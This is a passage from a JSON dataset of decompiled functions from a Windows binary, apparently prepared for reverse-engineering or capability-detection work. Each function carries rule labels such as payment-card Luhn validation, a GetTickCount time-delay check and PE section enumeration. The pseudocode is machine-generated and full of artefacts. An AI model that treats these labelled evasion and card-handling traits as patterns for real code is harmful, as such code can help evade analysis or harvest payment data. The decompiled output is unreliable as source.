0) {\n        (**0x46919c)(var_35ch, 0);\n        var_35ch = 0;\n    }\n    if (var_360h != 0) {\n        (**0x469250)(var_360h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(puVar3);\n    return;\n}\n",
        "token_count": 1246
    },
    "0041d360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nushort * fcn.0041d360(int32_t param_1, int32_t param_2, ushort *param_3)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch_2;\n    ushort *var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43eef1;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    var_4h._1_3_ = 0;\n    for (; var_8h != var_ch_2; var_8h = var_8h + 0x1c) {\n        var_4h._0_1_ = 1;\n        if (var_10h_2 != NULL) {\n            *(var_10h_2 + 10) = 7;\n            *(var_10h_2 + 8) = 0;\n            *var_10h_2 = 0;\n            fcn.0041a980(var_8h);\n        }\n        var_10h_2 = var_10h_2 + 0xe;\n    }\n    *in_FS_OFFSET = var_ch_3;\n    return var_10h_2;\n}\n",
        "token_count": 328
    },
    "0041de20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041de20(int32_t *param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_8h;\n    uint var_10h;\n    uint var_ch;\n    int32_t arg_8h;\n    int32_t arg_ch;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43efb0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    if (0x9249249 < var_8h) {\n        fcn.0042a14e(0x4453e8);\n    }\n    if ((param_1[2] - *param_1) / 0x1c < var_8h) {\n        iVar1 = fcn.00419080(var_8h);\n        var_4h = 0;\n        fcn.0041d360(*param_1, param_1[1], iVar1, param_1 + 3, 0, var_8h);\n        arg_8h = *param_1;\n        iVar2 = param_1[1] - arg_8h;\n        if (arg_8h != 0) {\n            piVar3 = param_1 + 3;\n            arg_ch = param_1[1];\n            uVar4 = var_8h;\n            fcn.00412e10(arg_8h, arg_ch);\n            fcn.0042ac49(*param_1, arg_8h, arg_ch, piVar3, uVar4);\n        }\n        param_1[2] = iVar1 + var_8h * 0x1c;\n        param_1[1] = iVar1 + (iVar2 / 0x1c) * 0x1c;\n        *param_1 = iVar1;\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 498
    },
    "0041dfc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041dfc0(int32_t param_1)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_4h_2;\n    uint var_8c0h;\n    uint var_8ach;\n    uint var_888h;\n    uint var_878h;\n    uint var_874h;\n    uint var_7e0h;\n    uint var_3f8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uchar *puVar6;\n    uint *in_stack_fffff6b0;\n    uint32_t noname_3;\n    uint *in_stack_fffff6b4;\n    int32_t in_stack_fffff6b8;\n    uint *in_stack_fffff6bc;\n    uint32_t in_stack_fffff6d8;\n    uint in_stack_fffff6dc;\n    uint in_stack_fffff6e0;\n    uint in_stack_fffff6e4;\n    uint var_8c0h_2;\n    uint *var_8bch_2;\n    uint *var_8b8h_2;\n    uint var_8b4h;\n    uint var_8b0h;\n    uint *var_8ach_3;\n    uint var_8a5h_2;\n    uint var_8bch;\n    uint32_t var_8b8h;\n    uint32_t var_888h_2;\n    uint var_8ach_2;\n    uint var_8a5h;\n    uint uStack2172;\n    uint32_t var_874h_2;\n    uint32_t var_86ch;\n    uint var_85ch;\n    uint32_t var_858h;\n    uint32_t var_850h;\n    uint var_840h;\n    uint32_t var_83ch;\n    uint32_t var_834h;\n    uint var_824h;\n    uint32_t var_820h;\n    uint32_t var_818h;\n    uint var_808h;\n    uint32_t var_804h;\n    uint32_t var_7fch;\n    uint *var_7f0h;\n    uint *var_7ech;\n    uint32_t var_7e8h;\n    uint var_7e0h_3;\n    uint var_7e0h_2;\n    uchar auStack1020 [40];\n    uint var_3f8h_2;\n    uint32_t var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_3;\n    \n    var_4h_3 = 0xffffffff;\n    uStack12 = 0x43f075;\n    var_ch_2 = *in_FS_OFFSET;\n    var_10h_2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    uVar1 = fcn.00421020(0x1a);\n    var_874h_2 = 0xf;\n    uStack2172 = 0;\n    var_888h_2 = var_888h_2 & 0xffffff00;\n    uVar2 = fcn.0042b420();\n    fcn.00406270(uVar1, uVar2);\n    var_4h_3 = 0;\n    fcn.0042acb0();\n    fcn.0042acb0();\n    fcn.00421020(0x1a);\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    fcn.00421020(0x1a);\n    (**0x469258)();\n    (**0x469258)();\n    (**0x469258)();\n    var_8ach_3 = &stack0xfffff6d8;\n    in_stack_fffff6d8 = in_stack_fffff6d8 & 0xffffff00;\n    uVar1 = fcn.0042b420();\n    puVar6 = auStack1020;\n    fcn.00406270(puVar6, uVar1);\n    fcn.00424ac0(&var_8bch_2, puVar6, uVar1, in_stack_fffff6d8, in_stack_fffff6dc, in_stack_fffff6e0, in_stack_fffff6e4)\n    ;\n    var_4h_3._0_1_ = 1;\n    var_8ach_3 = var_8b8h_2;\n    puVar5 = var_8bch_2;\n    if (var_8bch_2 != var_8b8h_2) {\n        do {\n            var_7e8h = 7;\n            var_7ech = NULL;\n            var_7fch = var_7fch & 0xffff0000;\n            fcn.00412ce0(puVar5, 0, 0xffffffff);\n            in_stack_fffff6bc = &var_7fch;\n            in_stack_fffff6b8 = &var_8a5h_2 + 1;\n            var_4h_3._0_1_ = 2;\n            uVar1 = fcn.00424280(in_stack_fffff6b8, in_stack_fffff6bc);\n            in_stack_fffff6b0 = &var_888h_2;\n            var_4h_3._0_1_ = 3;\n            uVar2 = fcn.0040e700(&var_850h, in_stack_fffff6b0, *0x458144);\n            var_4h_3._0_1_ = 4;\n            puVar3 = fcn.004064b0(&var_834h, uVar2, uVar1);\n            in_stack_fffff6b4 = &var_7fch;\n            var_4h_3._0_1_ = 5;\n            uVar1 = fcn.00424280(&var_86ch, in_stack_fffff6b4);\n            var_4h_3._0_1_ = 6;\n            puVar4 = fcn.00406460(&var_818h, *0x457f94, uVar1);\n            var_4h_3 = CONCAT31(var_4h_3._1_3_, 7);\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            if (0xf < puVar4[5]) {\n                puVar4 = *puVar4;\n            }\n            fcn.00429f90(*(param_1 + 0x20), puVar4, puVar3);\n            if (0xf < var_804h) {\n                fcn.0042ac49(var_818h);\n            }\n            var_804h = 0xf;\n            var_808h = 0;\n            var_818h = var_818h & 0xffffff00;\n            if (0xf < var_858h) {\n                fcn.0042ac49(var_86ch);\n            }\n            var_858h = 0xf;\n            var_85ch = 0;\n            var_86ch = var_86ch & 0xffffff00;\n            if (0xf < var_820h) {\n                fcn.0042ac49(var_834h);\n            }\n            var_820h = 0xf;\n            var_824h = 0;\n            var_834h = var_834h & 0xffffff00;\n            if (0xf < var_83ch) {\n                fcn.0042ac49(var_850h);\n            }\n            var_83ch = 0xf;\n            var_840h = 0;\n            var_850h = var_850h & 0xffffff00;\n            if (0xf < var_8b8h) {\n                fcn.0042ac49(stack0xfffff758);\n            }\n            var_4h_3._0_1_ = 1;\n            if (7 < var_7e8h) {\n                fcn.0042ac49(var_7fch);\n            }\n            puVar5 = puVar5 + 7;\n        } while (puVar5 != var_8ach_3);\n    }\n    var_8ach_3 = &stack0xfffff6b0;\n    noname_3 = in_stack_fffff6b0 & 0xffffff00;\n    uVar1 = fcn.0042b420(&var_7e0h_3);\n    puVar5 = &var_7e0h_3;\n    fcn.00406270(puVar5, uVar1);\n    puVar5 = fcn.00424ac0(&var_7f0h, puVar5, uVar1, noname_3, in_stack_fffff6b4, in_stack_fffff6b8, in_stack_fffff6bc);\n    if (&var_8bch_2 != puVar5) {\n        if (var_8bch_2 != NULL) {\n            puVar3 = &var_8b0h;\n            puVar4 = var_8bch_2;\n            puVar6 = var_8ach_3;\n            fcn.00412e10(var_8bch_2, var_8b8h_2);\n            fcn.0042ac49(var_8bch_2, puVar4, var_8b8h_2, puVar3, puVar6);\n        }\n        var_8bch_2 = *puVar5;\n        var_8b8h_2 = puVar5[1];\n        var_8b4h = puVar5[2];\n        *puVar5 = 0;\n        puVar5[1] = 0;\n        puVar5[2] = 0;\n    }\n    puVar3 = var_7ech;\n    var_4h_3 = CONCAT31(var_4h_3._1_3_, 1);\n    puVar5 = var_7f0h;\n    if (var_7f0h != NULL) {\n        for (; puVar5 != puVar3; puVar5 = puVar5 + 7) {\n            if (7 < puVar5[5]) {\n                fcn.0042ac49(*puVar5);\n            }\n            puVar5[5] = 7;\n            puVar5[4] = 0;\n            *puVar5 = 0;\n        }\n        fcn.0042ac49(var_7f0h);\n    }\n    var_8ach_3 = var_8b8h_2;\n    puVar5 = var_8bch_2;\n    if (var_8bch_2 != var_8b8h_2) {\n        do {\n            var_7fch = var_7fch & 0xffff0000;\n            var_7e8h = 7;\n            var_7ech = NULL;\n            fcn.00412ce0(puVar5, 0, 0xffffffff);\n            var_4h_3._0_1_ = 9;\n            uVar1 = fcn.00424280(&var_8a5h_2 + 1, &var_7fch);\n            var_4h_3._0_1_ = 10;\n            uVar2 = fcn.0040e700(&var_818h, &var_888h_2, *0x4582d8);\n            var_4h_3._0_1_ = 0xb;\n            puVar3 = fcn.004064b0(&var_86ch, uVar2, uVar1);\n            var_4h_3._0_1_ = 0xc;\n            uVar1 = fcn.00424280(&var_834h, &var_7fch);\n            var_4h_3._0_1_ = 0xd;\n            puVar4 = fcn.00406460(&var_850h, *0x458008, uVar1);\n            var_4h_3 = CONCAT31(var_4h_3._1_3_, 0xe);\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            if (0xf < puVar4[5]) {\n                puVar4 = *puVar4;\n            }\n            fcn.00429f90(*(param_1 + 0x20), puVar4, puVar3);\n            if (0xf < var_83ch) {\n                fcn.0042ac49(var_850h);\n            }\n            var_83ch = 0xf;\n            var_840h = 0;\n            var_850h = var_850h & 0xffffff00;\n            if (0xf < var_820h) {\n                fcn.0042ac49(var_834h);\n            }\n            var_820h = 0xf;\n            var_824h = 0;\n            var_834h = var_834h & 0xffffff00;\n            if (0xf < var_858h) {\n                fcn.0042ac49(var_86ch);\n            }\n            var_858h = 0xf;\n            var_85ch = 0;\n            var_86ch = var_86ch & 0xffffff00;\n            if (0xf < var_804h) {\n                fcn.0042ac49(var_818h);\n            }\n            var_804h = 0xf;\n            var_808h = 0;\n            var_818h = var_818h & 0xffffff00;\n            if (0xf < var_8b8h) {\n                fcn.0042ac49(stack0xfffff758);\n            }\n            var_4h_3 = CONCAT31(var_4h_3._1_3_, 1);\n            if (7 < var_7e8h) {\n                fcn.0042ac49(var_7fch);\n            }\n            puVar5 = puVar5 + 7;\n        } while (puVar5 != var_8ach_3);\n    }\n    puVar3 = var_8b8h_2;\n    puVar5 = var_8bch_2;\n    if (var_8bch_2 != NULL) {\n        for (; puVar5 != puVar3; puVar5 = puVar5 + 7) {\n            if (7 < puVar5[5]) {\n                fcn.0042ac49(*puVar5);\n            }\n            puVar5[5] = 7;\n            puVar5[4] = 0;\n            *puVar5 = 0;\n        }\n        fcn.0042ac49(var_8bch_2);\n    }\n    var_8bch_2 = NULL;\n    var_8b8h_2 = NULL;\n    var_8b4h = 0;\n    if (0xf < var_874h_2) {\n        fcn.0042ac49(var_888h_2);\n    }\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042ad2a(in_stack_fffff6b4);\n    return;\n}\n",
        "token_count": 3442
    },
    "0041e6a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_114h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041e6a0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    char *extraout_ECX;\n    int32_t *in_FS_OFFSET;\n    uint32_t uStackY100912;\n    uint uStackY100896;\n    uint32_t uStackY100892;\n    uint32_t uStackY100884;\n    uint uStackY100868;\n    uint32_t uStackY100864;\n    uint32_t uStackY100856;\n    uint uStackY100840;\n    uint32_t uStackY100836;\n    uint32_t uStackY100828;\n    uint uStackY100812;\n    uint32_t uStackY100808;\n    char acStackY100800 [100000];\n    uint var_31ch;\n    uint uStackY712;\n    uint *puStackY708;\n    uint uStackY704;\n    uint *puStackY700;\n    char *pcStackY696;\n    uint *puStackY692;\n    char *pcStackY688;\n    uint *puStackY684;\n    char *pcStackY680;\n    uint *puStackY676;\n    char *pcStackY672;\n    uint *puStackY668;\n    char *pcStackY664;\n    uint *puStackY660;\n    char *pcStackY656;\n    uint *puStackY652;\n    char *pcStackY648;\n    uint *puStackY644;\n    char *pcStackY640;\n    uint *puStackY636;\n    char *pcStackY632;\n    uint *puStackY628;\n    char *pcStackY624;\n    uint *puStackY620;\n    char *pcStackY616;\n    uint *puStackY612;\n    char *pcStackY608;\n    uint *puStackY604;\n    char *pcStackY600;\n    uint *puStackY596;\n    char *pcStackY592;\n    uint *puStackY588;\n    char *pcStackY584;\n    uint *puStackY580;\n    char *pcStackY576;\n    uint *puStackY572;\n    uint uStackY568;\n    uint *puStackY564;\n    uint uStackY560;\n    uint *puStackY556;\n    uint uStackY552;\n    uint *puStackY548;\n    uint uStackY544;\n    uint *var_218h;\n    char *pcStackY536;\n    uint *puStackY532;\n    uint uStackY528;\n    uint *puStackY524;\n    char *pcStackY520;\n    uint *puStackY516;\n    uint uStackY512;\n    uint *puStackY508;\n    char *pcStackY504;\n    uint *puStackY500;\n    uint uStackY496;\n    uint *puStackY492;\n    uint uStackY488;\n    uint *puStackY484;\n    uint uStackY480;\n    uint *puStackY476;\n    uint uStackY472;\n    uint *puStackY468;\n    char *pcStackY464;\n    uint *puStackY460;\n    uint uStackY456;\n    uint *puStackY452;\n    uint uStackY448;\n    uint *puStackY444;\n    char *pcStackY440;\n    uint *puStackY436;\n    uint uStackY432;\n    uint *puStackY428;\n    char *pcStackY424;\n    uint *puStackY420;\n    uint uStackY416;\n    uint *puStackY412;\n    uint uStackY408;\n    uint *puStackY404;\n    char *pcStackY400;\n    uint *puStackY396;\n    uint uStackY392;\n    char *arg_8h_00;\n    uint *var_114h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f0f8;\n    var_ch = *in_FS_OFFSET;\n    fcn.0042ae40();\n    *in_FS_OFFSET = &fcn.0041e6a0::var_ch;\n    fcn.0042acb0();\n    *(extraout_ECX + 0xc) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x18) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(extraout_ECX + 0x1c) = 0;\n    fcn.004186f0(arg_8h, arg_ch);\n    fcn.00418540(*0x458260, *0x458450, &stack0xfffe7640);\n    fcn.00418540(*0x457ecc, *0x458204, &stack0xfffe7640);\n    fcn.0041cdb0(*0x458344, *0x4580e8, *0x45837c, &stack0xfffe7640, 0);\n    fcn.0041cdb0(*0x458344, *0x458110, *0x457dd8, &stack0xfffe7640, 0);\n    fcn.0041cdb0(*0x458344, \"empty distance tree with lengths\", 0x4474b8, &stack0xfffe7640, 1);\n    fcn.0041cb30(*0x458124, *0x458190, &stack0xfffe7640);\n    fcn.0041cb30(*0x45841c, *0x457f28, &stack0xfffe7640);\n    fcn.0041cb30(*0x457f08, *0x4582ac, &stack0xfffe7640);\n    fcn.0041cb30(*0x4581e4, *0x458194, &stack0xfffe7640);\n    fcn.0041cb30(*0x458590, *0x4581bc, &stack0xfffe7640);\n    fcn.0041cb30(*0x457d84, *0x458498, &stack0xfffe7640);\n    fcn.0041cb30(*0x45815c, *0x4583c0, &stack0xfffe7640);\n    fcn.0041cb30(*0x458388, *0x457d90, &stack0xfffe7640);\n    fcn.0041cb30(*0x457f48, *0x458158, &stack0xfffe7640);\n    fcn.0041cb30(*0x457f68, *0x457ec4, &stack0xfffe7640);\n    fcn.0041cb30(*0x458210, *0x45814c, &stack0xfffe7640);\n    fcn.0041cb30(*0x457db0, *0x4584cc, &stack0xfffe7640);\n    fcn.0041cb30(*0x457ea0, *0x457dec, &stack0xfffe7640);\n    var_114h = *0x458598;\n    fcn.0041cb30(*0x458318, *0x458598, &stack0xfffe7640);\n    fcn.0041cb30(*0x458338, *0x457e80, &stack0xfffe7640);\n    fcn.0041cb30(*0x457d5c, *0x458468, &stack0xfffe7640);\n    fcn.0041cb30(*0x4583e4, *0x457e08, &stack0xfffe7640);\n    arg_8h_00 = 0x41e98e;\n    fcn.0041cb30(*0x457dcc, *0x457ff0, &stack0xfffe7640);\n    if (*extraout_ECX != '\\0') {\n        arg_8h_00 = 0x41e999;\n        fcn.0041dfc0();\n        if (*extraout_ECX != '\\0') {\n            arg_8h_00 = &stack0xfffe7640;\n            fcn.0041c4c0(arg_8h_00);\n            fcn.00418540(*0x4581f4, *0x457f64, &stack0xfffe7640);\n            fcn.0041d420();\n        }\n    }\n    if (extraout_ECX[5] != '\\0') {\n        fcn.0042acb0();\n        fcn.0042acb0();\n        fcn.0042acb0();\n        uStackY392 = 0x41ea1b;\n        fcn.00421020(0x1a);\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        (**0x469258)();\n        uStackY392 = 0x41ea74;\n        (**0x469258)();\n        uStackY392 = 0x447278;\n        puStackY396 = &fcn.0041e6a0::var_114h;\n        pcStackY400 = 0x41ea86;\n        (**0x469258)();\n        pcStackY400 = \"h tree\";\n        puStackY404 = &fcn.0041e6a0::var_114h;\n        uStackY408 = 0x41ea98;\n        (**0x469258)();\n        uStackY408 = 0x44791c;\n        puStackY412 = &fcn.0041e6a0::var_114h;\n        uStackY416 = 0x41eaaa;\n        (**0x469258)();\n        uStackY416 = 0x447254;\n        puStackY420 = &fcn.0041e6a0::var_114h;\n        pcStackY424 = 0x41eabc;\n        (**0x469258)();\n        pcStackY424 = \"ength tree\";\n        puStackY428 = &fcn.0041e6a0::var_114h;\n        uStackY432 = 0x41eace;\n        (**0x469258)();\n        uStackY432 = 0x447418;\n        puStackY436 = &fcn.0041e6a0::var_114h;\n        pcStackY440 = 0x41eae0;\n        (**0x469258)();\n        pcStackY440 = \"al/length tree\";\n        puStackY444 = &fcn.0041e6a0::var_114h;\n        uStackY448 = 0x41eaf2;\n        (**0x469258)();\n        uStackY448 = 0x447278;\n        puStackY452 = &fcn.0041e6a0::var_114h;\n        uStackY456 = 0x41eb04;\n        (**0x469258)();\n        uStackY456 = 0x447270;\n        puStackY460 = &fcn.0041e6a0::var_114h;\n        pcStackY464 = 0x41eb16;\n        (**0x469258)();\n        pcStackY464 = \"iteral/length tree\";\n        puStackY468 = &fcn.0041e6a0::var_114h;\n        uStackY472 = 0x41eb28;\n        (**0x469258)();\n        uStackY472 = 0x447274;\n        puStackY476 = &fcn.0041e6a0::var_114h;\n        uStackY480 = 0x41eb3a;\n        (**0x469258)();\n        uStackY480 = 0x447918;\n        puStackY484 = &fcn.0041e6a0::var_114h;\n        uStackY488 = 0x41eb4c;\n        (**0x469258)();\n        uStackY488 = 0x447920;\n        puStackY492 = &fcn.0041e6a0::var_114h;\n        uStackY496 = 0x41eb5e;\n        (**0x469258)();\n        uStackY496 = 0x445418;\n        puStackY500 = &fcn.0041e6a0::var_114h;\n        pcStackY504 = 0x41eb70;\n        (**0x469258)();\n        pcStackY504 = \"iteral/length tree\";\n        puStackY508 = &fcn.0041e6a0::var_31ch;\n        uStackY512 = 0x41eb82;\n        (**0x469258)();\n        uStackY512 = 0x447278;\n        puStackY516 = &fcn.0041e6a0::var_31ch;\n        pcStackY520 = 0x41eb94;\n        (**0x469258)();\n        pcStackY520 = \"ed literal/length tree\";\n        puStackY524 = &fcn.0041e6a0::var_31ch;\n        uStackY528 = 0x41eba6;\n        (**0x469258)();\n        uStackY528 = 0x447474;\n        puStackY532 = &fcn.0041e6a0::var_31ch;\n        pcStackY536 = 0x41ebb8;\n        (**0x469258)();\n        pcStackY536 = \"cribed literal/length tree\";\n        var_218h = &fcn.0041e6a0::var_31ch;\n        uStackY544 = 0x41ebca;\n        (**0x469258)();\n        uStackY544 = 0x447254;\n        puStackY548 = &fcn.0041e6a0::var_31ch;\n        uStackY552 = 0x41ebdc;\n        (**0x469258)();\n        uStackY552 = 0x447274;\n        puStackY556 = &fcn.0041e6a0::var_31ch;\n        uStackY560 = 0x41ebee;\n        (**0x469258)();\n        uStackY560 = 0x447254;\n        puStackY564 = &fcn.0041e6a0::var_31ch;\n        uStackY568 = 0x41ec00;\n        (**0x469258)();\n        uStackY568 = 0x447270;\n        puStackY572 = &fcn.0041e6a0::var_31ch;\n        pcStackY576 = 0x41ec12;\n        (**0x469258)();\n        pcStackY576 = \"al/length tree\";\n        puStackY580 = &fcn.0041e6a0::var_218h;\n        pcStackY584 = 0x41ec24;\n        (**0x469258)();\n        pcStackY584 = \"subscribed literal/length tree\";\n        puStackY588 = &fcn.0041e6a0::var_218h;\n        pcStackY592 = 0x41ec36;\n        (**0x469258)();\n        pcStackY592 = \"oversubscribed literal/length tree\";\n        puStackY596 = &fcn.0041e6a0::var_218h;\n        pcStackY600 = 0x41ec48;\n        (**0x469258)();\n        pcStackY600 = \"oversubscribed literal/length tree\";\n        puStackY604 = &fcn.0041e6a0::var_218h;\n        pcStackY608 = 0x41ec5a;\n        (**0x469258)();\n        pcStackY608 = \"ee\";\n        puStackY612 = &fcn.0041e6a0::var_218h;\n        pcStackY616 = 0x41ec6c;\n        (**0x469258)();\n        pcStackY616 = \"oversubscribed literal/length tree\";\n        puStackY620 = &fcn.0041e6a0::var_218h;\n        pcStackY624 = 0x41ec7e;\n        (**0x469258)();\n        pcStackY624 = \"subscribed literal/length tree\";\n        puStackY628 = &fcn.0041e6a0::var_218h;\n        pcStackY632 = 0x41ec90;\n        (**0x469258)();\n        pcStackY632 = \"h tree\";\n        puStackY636 = &fcn.0041e6a0::var_218h;\n        pcStackY640 = 0x41eca2;\n        (**0x469258)();\n        pcStackY640 = \"al/length tree\";\n        puStackY644 = &fcn.0041e6a0::var_218h;\n        pcStackY648 = 0x41ecb4;\n        (**0x469258)();\n        pcStackY648 = \"ength tree\";\n        puStackY652 = &fcn.0041e6a0::var_218h;\n        pcStackY656 = 0x41ecc6;\n        (**0x469258)();\n        pcStackY656 = \"al/length tree\";\n        puStackY660 = &fcn.0041e6a0::var_218h;\n        pcStackY664 = 0x41ecd8;\n        (**0x469258)();\n        pcStackY664 = \"h tree\";\n        puStackY668 = &fcn.0041e6a0::var_218h;\n        pcStackY672 = 0x41ecea;\n        (**0x469258)();\n        pcStackY672 = \"al/length tree\";\n        puStackY676 = &fcn.0041e6a0::var_218h;\n        pcStackY680 = 0x41ecfc;\n        (**0x469258)();\n        pcStackY680 = \"ee\";\n        puStackY684 = &fcn.0041e6a0::var_218h;\n        pcStackY688 = 0x41ed0e;\n        (**0x469258)();\n        pcStackY688 = \"subscribed literal/length tree\";\n        puStackY692 = &fcn.0041e6a0::var_218h;\n        pcStackY696 = 0x41ed20;\n        (**0x469258)();\n        pcStackY696 = \"iteral/length tree\";\n        puStackY700 = &fcn.0041e6a0::var_218h;\n        uStackY704 = 0x41ed32;\n        (**0x469258)();\n        uStackY704 = 0x447ba8;\n        puStackY708 = &fcn.0041e6a0::var_218h;\n        uStackY712 = 0x41ed44;\n        (**0x469258)();\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, &fcn.0041e6a0::var_31ch, \"incomplete literal/length tree\");\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, &fcn.0041e6a0::var_218h, \"incomplete literal/length tree\");\n        uStackY100808 = 0xf;\n        uStackY100812 = 0;\n        uStackY100828 = uStackY100828 & 0xffffff00;\n        uVar1 = fcn.0042b420();\n        fcn.00406270(0x447c50, uVar1);\n        var_4h = 0;\n        puVar2 = fcn.00406460(&stack0xfffe7608, 0x447c4c, &stack0xfffe7624);\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, puVar2, \"incomplete literal/length tree\");\n        if (0xf < uStackY100836) {\n            fcn.0042ac49();\n        }\n        uStackY100836 = 0xf;\n        uStackY100840 = 0;\n        uStackY100856 = uStackY100856 & 0xffffff00;\n        var_4h = 0xffffffff;\n        if (0xf < uStackY100808) {\n            fcn.0042ac49();\n        }\n        uStackY100808 = 0xf;\n        uStackY100812 = 0;\n        uStackY100828 = uStackY100828 & 0xffffff00;\n        uVar1 = fcn.0042b420();\n        fcn.00406270(0x447c40, uVar1);\n        var_4h = 2;\n        puVar2 = fcn.00406460(&stack0xfffe7608, 0x447c34, &stack0xfffe7624);\n        var_4h = CONCAT31(var_4h._1_3_, 3);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, puVar2, \"incomplete literal/length tree\");\n        if (0xf < uStackY100836) {\n            fcn.0042ac49();\n        }\n        uStackY100836 = 0xf;\n        uStackY100840 = 0;\n        uStackY100856 = uStackY100856 & 0xffffff00;\n        var_4h = 0xffffffff;\n        if (0xf < uStackY100808) {\n            fcn.0042ac49();\n        }\n        uStackY100808 = 0xf;\n        uStackY100812 = 0;\n        uStackY100828 = uStackY100828 & 0xffffff00;\n        uVar1 = fcn.0042b420();\n        fcn.00406270(0x447c28, uVar1);\n        var_4h = 4;\n        puVar2 = fcn.00406460(&stack0xfffe7608, 0x447c1c, &stack0xfffe7624);\n        var_4h = CONCAT31(var_4h._1_3_, 5);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, puVar2, \"incomplete literal/length tree\");\n        if (0xf < uStackY100836) {\n            fcn.0042ac49();\n        }\n        uStackY100836 = 0xf;\n        uStackY100840 = 0;\n        uStackY100856 = uStackY100856 & 0xffffff00;\n        var_4h = 0xffffffff;\n        if (0xf < uStackY100808) {\n            fcn.0042ac49();\n        }\n        uStackY100864 = 0xf;\n        uStackY100868 = 0;\n        uStackY100884 = uStackY100884 & 0xffffff00;\n        uVar1 = fcn.0042b420();\n        fcn.00406270(0x447c10, uVar1);\n        var_4h = 6;\n        puVar2 = fcn.00406460(&stack0xfffe75d0, 0x447c04, &stack0xfffe75ec);\n        var_4h = CONCAT31(var_4h._1_3_, 7);\n        if (0xf < puVar2[5]) {\n            puVar2 = *puVar2;\n        }\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, puVar2, \"incomplete literal/length tree\");\n        if (0xf < uStackY100892) {\n            fcn.0042ac49();\n        }\n        uStackY100892 = 0xf;\n        uStackY100896 = 0;\n        uStackY100912 = uStackY100912 & 0xffffff00;\n        var_4h = 0xffffffff;\n        if (0xf < uStackY100864) {\n            fcn.0042ac49();\n        }\n        uStackY100864 = 0xf;\n        uStackY100868 = 0;\n        uStackY100884 = uStackY100884 & 0xffffff00;\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, 0x447bf8, \"incomplete literal/length tree\");\n        var_114h = &fcn.0041e6a0::var_114h;\n        fcn.00416ec0(0x4453cc, var_114h, 0x447bf0, \"incomplete literal/length tree\");\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, 0x447be4, \"incomplete literal/length tree\");\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, 0x447bcc, \"incomplete literal/length tree\");\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, 0x447bb4, \"incomplete literal/length tree\");\n        arg_8h_00 = \"incomplete literal/length tree\";\n        fcn.00416ec0(0x4453cc, &fcn.0041e6a0::var_114h, 0x447bac, \"incomplete literal/length tree\");\n    }\n    *(extraout_ECX + 0xc) = *0x45879c;\n    *(extraout_ECX + 0x10) = *0x4587a8;\n    uVar1 = (**0x469150)();\n    fcn.00429fe0(*(extraout_ECX + 0x20), *0x458400, &stack0xfffe7640, uVar1);\n    fcn.0042acb0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    